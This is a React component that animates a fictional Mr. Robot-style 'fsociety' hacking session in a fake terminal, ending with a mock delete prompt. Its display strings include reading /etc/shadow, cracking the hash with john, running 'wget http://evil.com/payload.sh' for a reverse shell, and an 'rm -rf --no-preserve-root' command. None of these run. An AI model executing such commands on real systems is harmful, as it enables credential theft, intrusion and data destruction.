import { useState, useEffect, useRef } from 'react'
import { motion } from 'framer-motion'

const fsocietyAscii = [
  '  ███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗',
  '  ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝',
  '  █████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ ',
  '  ██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  ',
  '  ██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   ',
  '  ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   ',
  '',
  '                    [INITIALIZING SYSTEM...]',
  ''
]

const hackingCommands = [
  { text: 'root@fsociety:~# nmap -sS -O 192.168.1.0/24', delay: 100 },
  { text: 'Starting Nmap 7.80 ( https://nmap.org )', delay: 80, isOutput: true },
  { text: 'Nmap scan report for 192.168.1.1', delay: 60, isOutput: true },
  { text: 'Host is up (0.0023s latency).', delay: 60, isOutput: true },
  { text: 'PORT     STATE SERVICE', delay: 50, isOutput: true },
  { text: '22/tcp   open  ssh', delay: 40, isOutput: true },
  { text: '80/tcp   open  http', delay: 40, isOutput: true },
  { text: '443/tcp  open  https', delay: 40, isOutput: true },
  { text: '', delay: 80 },
  { text: 'root@fsociety:~# ssh elliot@192.168.1.1', delay: 120 },
  { text: 'elliot@192.168.1.1\'s password: ********', delay: 100, isOutput: true },
  { text: 'Welcome to Ubuntu 20.04.3 LTS', delay: 80, isOutput: true },
  { text: 'Last login: Mon Oct 13 23:59:59 2025', delay: 60, isOutput: true },
  { text: '', delay: 80 },
  { text: 'elliot@target:~$ sudo -i', delay: 100 },
  { text: '[sudo] password for elliot: ********', delay: 80, isOutput: true },
  { text: '', delay: 60 },
  { text: 'root@target:~# cat /etc/shadow | grep root', delay: 120 },
  { text: 'root:$6$xyz...:18900:0:99999:7:::', delay: 80, isOutput: true },
  { text: '', delay: 80 },
  { text: 'root@target:~# john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt', delay: 150 },
  { text: 'Loaded 1 password hash (sha512crypt)', delay: 100, isOutput: true },
  { text: 'Press Ctrl-C to abort, or send SIGUSR1 to john process for status', delay: 80, isOutput: true },
  { text: 'password123      (root)', delay: 200, isOutput: true },
  { text: '1g 0:00:00:02 DONE', delay: 60, isOutput: true },
  { text: '', delay: 100 },
  { text: 'root@target:~# wget http://evil.com/payload.sh', delay: 120 },
  { text: 'Connecting to evil.com... connected.', delay: 80, isOutput: true },
  { text: 'HTTP request sent, awaiting response... 200 OK', delay: 80, isOutput: true },
  { text: 'payload.sh saved [2048/2048]', delay: 60, isOutput: true },
  { text: '', delay: 80 },
  { text: 'root@target:~# chmod +x payload.sh && ./payload.sh', delay: 120 },
  { text: '[*] Establishing reverse shell...', delay: 100, isOutput: true },
  { text: '[+] Connection established to 10.0.0.1:4444', delay: 120, isOutput: true },
  { text: '[+] Root access granted', delay: 100, isOutput: true },
  { text: '', delay: 100 },
  { text: 'root@target:~# ls -la /root/.hidden/', delay: 120 },
  { text: 'total 24', delay: 60, isOutput: true },
  { text: 'drwxr-xr-x 2 root root 4096 Oct 13 23:59 .', delay: 40, isOutput: true },
  { text: 'drwxr-xr-x 8 root root 4096 Oct 13 23:59 ..', delay: 40, isOutput: true },
  { text: '-rw-r--r-- 1 root root  220 Oct 13 23:59 fsociety00.dat', delay: 60, isOutput: true },
  { text: '', delay: 120 },
  { text: 'root@target:~# cat /root/.hidden/fsociety00.dat', delay: 150 },
  { text: '', delay: 200 }
]

function HackingTerminal({ onComplete, onDelete }) {
  const [lines, setLines] = useState([])
  const [currentIndex, setCurrentIndex] = useState(0)
  const [showAscii, setShowAscii] = useState(true)
  const [showDeletePrompt, setShowDeletePrompt] = useState(false)
  const [sidebarHover, setSidebarHover] = useState(false)
  const terminalBodyRef = useRef(null)

  // Auto-scroll to bottom
  useEffect(() => {
    if (terminalBodyRef.current) {
      terminalBodyRef.current.scrollTop = terminalBodyRef.current.scrollHeight
    }
  }, [lines, showDeletePrompt])

  // Show ASCII art for 2 seconds then start commands
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowAscii(false)
    }, 2000)
    return () => clearTimeout(timer)
  }, [])

  // Run hacking commands
  useEffect(() => {
    if (showAscii) return

    if (currentIndex >= hackingCommands.length) {
      // Clear terminal and show delete prompt
      setTimeout(() => {
        setLines([])
        setShowDeletePrompt(true)
      }, 500)
      return
    }

    const command = hackingCommands[currentIndex]
    const timer = setTimeout(() => {
      setLines(prev => [...prev, command])
      setCurrentIndex(prev => prev + 1)
    }, command.delay)

    return () => clearTimeout(timer)
  }, [currentIndex, showAscii])



  // Keyboard shortcuts
  useEffect(() => {
    if (!showDeletePrompt) return

    const handleKeyPress = (e) => {
      if (e.key === '0') {
        // Redirect to fsociety image
        window.location.href = '/fsociety.gif'
      } else if (e.key === '1') {
        onComplete()
      }
    }

    window.addEventListener('keydown', handleKeyPress)
    return () => window.removeEventListener('keydown', handleKeyPress)
  }, [showDeletePrompt, onComplete])

  return (
    <motion.div 
      className="hacking-terminal-fullscreen"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.3 }}
    >
      <div className="terminal-window">
        <div className="terminal-body-fullscreen" ref={terminalBodyRef}>
          {showAscii && (
            <motion.div 
              className="ascii-art"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              {fsocietyAscii.map((line, index) => (
                <motion.div
                  key={index}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: index * 0.1, duration: 0.3 }}
                >
                  {line}
                </motion.div>
              ))}
            </motion.div>
          )}

          {!showAscii && !showDeletePrompt && lines.map((line, index) => (
            <motion.div
              key={index}
              className={`terminal-line ${line.isOutput ? 'output' : ''}`}
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.1 }}
            >
              <span>{line.text}</span>
              {index === lines.length - 1 && !line.isOutput && line.text && (
                <span className="terminal-cursor">_</span>
              )}
            </motion.div>
          ))}

          {showDeletePrompt && (
            <motion.div
              className="delete-prompt"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              <div className="prompt-file">fsociety00.dat</div>
              <div className="prompt-message">Leave me here</div>
              <div className="prompt-separator">─────────────────────────────────────</div>
              <div className="prompt-command">$ rm -rf --no-preserve-root /root/fsociety/</div>
              <div className="prompt-question">
                Are you sure you want to delete '/root/fsociety/' ?
              </div>
              <div className="prompt-choice-line">
                <span>Press </span>
                <span 
                  className="choice-number delete-choice"
                  onClick={() => window.location.href = '/fsociety.gif'}
                >
                  [0]
                </span>
                <span> to delete or </span>
                <span 
                  className="choice-number cancel-choice"
                  onClick={() => onComplete()}
                >
                  [1]
                </span>
                <span> to cancel</span>
              </div>
              <div className="prompt-cursor-line">
                <span className="prompt-symbol">{'>'}</span>
                <span className="terminal-cursor">_</span>
              </div>
            </motion.div>
          )}
        </div>
      </div>
    </motion.div>
  )
}

export default HackingTerminal
